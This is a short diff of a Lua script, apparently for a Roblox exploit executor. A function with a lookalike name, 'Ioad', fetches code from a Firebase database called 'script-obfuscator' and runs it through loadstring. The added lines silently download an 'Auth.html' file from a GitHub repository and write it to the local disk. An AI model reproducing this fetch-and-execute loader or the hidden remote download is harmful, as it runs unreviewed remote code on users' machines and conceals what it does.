@@ -3,3 +3,7 @@ local FirebaseURL = "https://script-obfuscator-default-rtdb.firebaseio.com/"
 function Ioad(id)
  loadstring(game.HttpService:JSONDecode(game:HttpGet(FirebaseURL.."Scripts/"..id..".json")).Script)()
 end
+
+local FileScript, isSupported = pcall(function()
+writefile('Auth.html', game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Authorization/refs/heads/main/index.html"))
+end)
